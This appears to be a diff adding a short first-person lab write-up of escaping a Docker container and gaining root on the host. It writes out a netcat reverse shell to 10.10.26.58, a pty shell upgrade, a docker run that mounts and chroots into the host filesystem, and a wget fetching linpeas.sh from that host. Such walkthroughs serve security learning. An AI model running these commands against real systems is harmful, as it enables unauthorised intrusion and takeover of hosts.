@@ -1,0 +1,11 @@
+The goal of this project was to exploit vulnerabilities in a containerized application to gain access to the host system, escalate privileges, and perform a security audit using popular tools like linpeas.sh. Initially, I set up a listener on the host machine to listen for incoming connections on port 4444 with the command nc -nlvp 4444. This prepared the environment for reverse shell connections.
+
+Afterward, I attempted to establish a reverse shell connection from within the target container back to the host system by running nc -e /bin/bash 10.10.26.58 4444. However, the shell I received was non-interactive. To fix this, I utilized Python to spawn an interactive bash shell with python3 -c 'import pty; pty.spawn("/bin/bash")'. This allowed me to gain a fully interactive shell on the target system, giving me more control over the container.
+
+Next, I inspected the Docker environment and the containers running on it by using docker images and docker ps. I identified a relevant Docker image and then executed a command to mount the host system’s root filesystem into the container, thus giving me access to the host system’s file structure. The command I used for this was docker run -it -v /:/host/ d5954e1d9fa4 chroot /host/ bash.
+
+This command allowed me to escape the container's isolated environment and interact directly with the host system’s filesystem. To explore the filesystem, I used ls -la / and navigated through the directories.
+
+At this point, I discovered a file named flag.txt and a potentially important directory /tmp. I then proceeded to download and execute linpeas.sh, a script commonly used for privilege escalation checks on Linux systems. To fetch the script, I used the wget command: wget http://10.10.26.58:4444/linpeas.sh.
+
+After executing linpeas.sh, I was able to identify weaknesses and misconfigurations in the system that allowed me to escalate privileges. Ultimately, I gained root access to the host system. This project demonstrates the risks associated with improperly secured Docker environments and illustrates the process of privilege escalation within such environments. Through this process, I successfully broke out of the container’s isolation and gained full control over the host system, emphasizing the need to properly secure Docker containers and other virtualized systems in real-world environments.
